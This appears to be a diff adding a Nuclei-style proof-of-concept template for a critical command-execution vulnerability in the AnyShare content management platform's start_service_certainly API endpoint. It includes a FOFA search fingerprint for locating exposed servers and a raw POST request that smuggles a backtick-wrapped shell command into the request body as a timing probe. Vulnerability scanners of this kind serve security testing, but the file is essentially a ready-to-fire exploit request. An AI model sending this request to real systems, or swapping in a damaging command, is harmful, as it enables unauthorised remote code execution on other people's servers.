@@ -1,0 +1,30 @@
+id: poc-xz1tr92u4vkcec8n
+info:
+  name: 爱数AnyShare智能内容管理平台 start_service_certainly 存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xz1tr92u4vkcec8n'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xz1tr92u4vkcec8n
+    fofa: body="/res/libs/webuploader/webuploader.css"
+http:
+- raw:
+  - 'POST /api/ServiceAgent/start_service_certainly HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko
+
+    Accept-Encoding: gzip
+
+
+    ["`sleep 4`",0]'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
